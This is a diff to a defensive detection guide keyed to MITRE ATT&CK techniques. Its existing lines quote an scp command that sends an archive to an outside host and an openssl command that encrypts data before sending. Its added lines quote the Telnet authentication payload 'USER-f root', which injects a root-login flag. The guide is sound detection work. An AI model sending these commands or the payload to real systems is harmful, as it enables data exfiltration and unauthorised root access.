@@ -13,3 +13,7 @@
 # SSH Tunneling [T1572](https://attack.mitre.org/techniques/T1572/)
 1. Look for tunneling with command line similar to ```scp -o StrictHostKeyChecking=no -o BatchMode=yes ssh.tar.gz vagrant@198.51.100.2:/tmp```. 
 2. Look for use of openssl to encrypt data before tunneling takes place with ```openssl enc -aes-256-cbc -salt -pass pass:test123 -in /home/ransom_test/upload.tar.gz -out /home/ransom_test/encrypted_upload.tar.gz```. 
+
+# Detect CVE-2026-24061 for Telnet [T1190](https://attack.mitre.org/techniques/T1190/)[T1021](https://attack.mitre.org/techniques/T1021/)
+1. Identify hex data within the the Authentication Command portion of the Telnet traffic that looks like: ```000055534552012d6620726f6f7400444953504c4159016b616c693a302e30```. Decoding the hex results in ```USER-f rootDISPLAYkali:0.0```. 
+2. Identify ASCII text in the TCP stream of the Telnet data that looks like ```USER-f rootDISPLAYkali:0.0``` in the initial authentication. 
